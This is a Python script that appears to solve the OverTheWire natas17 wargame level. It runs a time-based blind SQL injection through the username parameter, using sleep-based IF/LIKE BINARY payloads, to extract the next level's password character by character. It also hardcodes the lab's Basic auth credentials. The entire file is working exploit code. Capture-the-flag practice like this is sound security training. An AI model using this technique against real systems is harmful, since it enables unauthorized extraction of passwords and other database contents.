import requests

chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
foundChars= []

useragent = "Mozilla/5.0 (X11; Linux i686; rv:61.0) Gecko/20100101 Firefox/61.0"
auth = "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="
url = "http://natas17.natas.labs.overthewire.org/"
headers = {"User-Agent":useragent, "Authorization":auth}


def findChars():
	for c in chars:
		query = 'natas18" AND IF( password LIKE BINARY"%'+c+'%", sleep(3), null)#'
		param = {"username":query}
		try:
			r = requests.post(url, headers=headers, params=param, timeout=1)
		except requests.exceptions.Timeout:
			foundChars.append(c)
			print("".join(foundChars))


def findFlag():
	flag = []
	j=0	
	while (j<32):
		flag.append(foundChars[0])
		for c in foundChars:
			flag[j] = c
			query = 'natas18" AND IF( password LIKE BINARY"'+"".join(flag)+'%", sleep(3), null)#'
			param = {"username":query}
			try:
				r = requests.post(url, headers=headers, params=param, timeout=1)
			except requests.exceptions.Timeout:
				print("flag: {}".format("".join(flag)))
				j+=1
				break
	return flag

findChars()
print("flag: {}".format("".join(findFlag())))
print("finished!!")
